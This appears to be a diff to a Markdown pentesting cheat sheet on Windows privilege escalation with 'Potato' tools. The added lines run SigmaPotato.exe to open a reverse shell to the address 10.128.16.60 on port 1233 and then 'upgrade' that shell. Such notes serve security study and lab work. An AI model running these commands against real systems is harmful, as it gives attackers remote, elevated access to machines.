@@ -35,6 +35,18 @@ Use Sigma Potato to add a new user:
 
 {% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" %}
 
+Use Sigma Potato to get a rev shell:
+
+```powershell
+.\SigmaPotato.exe --revshell 10.128.16.60 1233
+```
+
+Upgrade shell:
+
+```powershell
+.\SigmaPotato.exe -i
+```
+
 
 
 Printspoofer:
